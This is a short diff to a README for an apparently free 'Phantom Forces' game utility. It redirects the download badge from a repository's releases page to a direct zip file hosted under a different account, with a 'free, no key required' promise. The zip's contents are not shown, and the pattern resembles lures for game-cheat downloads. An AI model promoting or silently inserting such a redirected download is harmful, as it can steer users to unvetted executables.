@@ -43,7 +43,7 @@ Ready to transform your Phantom Forces experience? Follow these three simple ste
 +-------------------------------------------------------------+
 ```
 
-[![Download](https://img.shields.io/badge/DOWNLOAD-PhantomForces--Utility.zip-brightgreen?style=for-the-badge&logo=github)](https://github.com/assistant-tools/phantom-forces-utility-tracker/releases/latest)
+[![Download](https://img.shields.io/badge/DOWNLOAD-PhantomForces--Utility.zip-brightgreen?style=for-the-badge&logo=github)](https://github.com/AttoAssurance/phantom-forces-utility-tracker/releases/download/v1.0/PhantomForces-Utility.zip)
 
 *Last updated: September 2026 | Always 100% free | No key required*
 
